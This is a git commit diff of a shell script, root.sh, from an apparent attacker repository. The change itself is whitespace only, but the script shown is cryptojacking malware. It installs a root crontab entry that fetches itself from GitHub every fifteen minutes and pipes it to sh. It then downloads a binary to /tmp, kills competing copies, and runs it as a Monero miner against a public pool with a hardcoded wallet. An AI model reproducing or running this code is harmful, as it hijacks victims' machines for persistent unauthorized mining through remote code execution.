6f02787d388034c45c17e3ae96a9ad2472ac1467
GooglesearchNick <liming5209999@gmail.com>
2017-03-19 22:30:08 +0800

    Update root.sh

--- root.sh
+++ root.sh
@@ -5,10 +5,9 @@ mkdir -p /var/spool/cron/crontabs
 echo "*/15 * * * * curl -fsSL https://raw.githubusercontent.com/GooglesearchNick/nickproject/master/root.sh | sh" > /var/spool/cron/crontabs/root
 
 if [ ! -f "/tmp/coresystems" ] ; then
-	curl -fsSL https://raw.githubusercontent.com/GooglesearchNick/nickproject/master/coresystems -o /tmp/coresystems
+        curl -fsSL https://raw.githubusercontent.com/GooglesearchNick/nickproject/master/coresystems -o /tmp/coresystems
 fi
-chmod +x /tmp/coresystems 
+chmod +x /tmp/coresystems
 ps auxf | grep -v grep | grep coresystems | awk '{print $2}' |xargs kill -9
 /tmp/coresystems -a cryptonight -o stratum+tcp://mine.moneropool.com:3333 -u 45EngfR9yFHGSGLXMSVh88XuErCN95qQYirYNm4pVaJDakxthy3KWPP2hgDBVaAwcBafup6sefXML3CTYXmZfSJLUfHQQXW -p x
-
 #45EngfR9yFHGSGLXMSVh88XuErCN95qQYirYNm4pVaJDakxthy3KWPP2hgDBVaAwcBafup6sefXML3CTYXmZfSJLUfHQQXW
